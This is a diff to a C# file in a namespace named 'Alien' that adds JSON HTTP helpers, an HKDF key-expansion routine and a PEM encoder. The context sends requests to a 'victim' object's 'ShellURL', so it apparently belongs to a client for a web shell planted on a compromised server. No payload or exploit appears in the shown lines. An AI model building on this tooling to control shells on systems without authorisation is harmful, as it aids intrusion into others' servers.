@@ -1,9 +1,13 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Data.Entity.Core.Mapping;
 using System.Linq;
 using System.Reflection.Metadata;
+using System.Security.Cryptography;
 using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
+using static System.Runtime.InteropServices.JavaScript.JSType;
 
 namespace Alien
 {
@@ -86,6 +90,62 @@ namespace Alien
             {
                 BaseAddress = new Uri(m_victim.ShellURL),
             };
+        }
+
+        public JsonElement fnGetJson(string szUrl)
+        {
+            var res = m_clnt.GetStringAsync(szUrl).Result;
+            return JsonDocument.Parse(res).RootElement;
+        }
+
+        public JsonElement fnPostJson(string szUrl, object objJson)
+        {
+            string json = JsonSerializer.Serialize(objJson);
+            var res = m_clnt.PostAsync(szUrl, new StringContent(json, Encoding.UTF8, "application/json")).Result;
+
+            string text = res.Content.ReadAsStringAsync().Result;
+
+            return JsonDocument.Parse(text).RootElement;
+        }
+
+        private byte[] fnabHKDFExpand(byte[] abIKM, int nLength, string szInfo)
+        {
+            using var hmac = new HMACSHA256();
+            hmac.Key = new byte[32];
+
+            byte[] abPRK = hmac.ComputeHash(abIKM);
+            byte[] t = Array.Empty<byte>();
+            byte[] abOKM = new byte[nLength];
+
+            int pos = 0;
+            byte counter = 1;
+
+            while (pos < nLength)
+            {
+                hmac.Key = abPRK;
+
+                byte[] abInput = new byte[t.Length + Encoding.UTF8.GetByteCount(szInfo) + 1];
+                Buffer.BlockCopy(t, 0, abInput, 0, t.Length);
+                Buffer.BlockCopy(Encoding.UTF8.GetBytes(szInfo), 0, abInput, t.Length, Encoding.UTF8.GetByteCount(szInfo));
+                abInput[^1] = counter++;
+
+                t = hmac.ComputeHash(abInput);
+
+                int nCopyLen = Math.Min(t.Length, nLength - pos);
+                Buffer.BlockCopy(t, 0, abOKM, pos, nCopyLen);
+
+                pos += nCopyLen;
+            }
+
+            return abOKM;
+        }
+
+        private string fnszPemEncode(string szLabel, byte[] abData)
+        {
+            return
+                $"-----BEGIN {szLabel}-----\n" +
+                Convert.ToBase64String(abData, Base64FormattingOptions.InsertLineBreaks) +
+                $"\n-----END {szLabel}-----";
         }
 
         /// <summary>
